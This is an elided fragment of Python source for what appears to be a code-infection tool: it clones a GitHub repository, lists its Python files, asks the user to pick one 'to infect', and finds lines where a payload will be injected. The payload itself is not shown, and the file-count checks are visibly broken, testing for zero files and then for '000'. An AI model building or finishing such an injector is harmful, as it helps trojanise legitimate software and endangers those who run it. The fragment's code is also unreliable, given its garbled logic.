...
def github(script):
    repo = script
    directory = repo.split('/')[4]

    cwd = os.path.dirname(os.path.abspath(__file__))

    os.system('git clone %s %s/%s -q' % (repo, cwd, directory)) 

    os.system('cd %s/%s && ls > temp.txt' % (cwd, directory))
    python_files = []

    with open('%s/%s/temp.txt' % (cwd, directory), 'r') as f:
    ...
    if len(python_files) == 0:
        ...
        for file in python_files:
            ...
            number = number + 1
        number = input('%s Select a file to infect: ' % que)
        script = python_files[int(number) - 1]

    elif len(python_files) == 000:


        script = python_files[0]

    print ('%s Payload will be injected in %s%s%s' % (info, green, script, end))
    os.system('rm -r %s/%s/temp.txt' % (cwd, directory))
    cwd2 = os.chdir('%s/%s' % (cwd, directory))
    github = True
    injector(script)
    ...
    with open(script, 'r') as f:
        for line in f:
            ...
            if match and not line.startswith('except') and not line.startswith('else') and not line.startswith('#') and not match2:
                injectable_lines.append(number - 1)
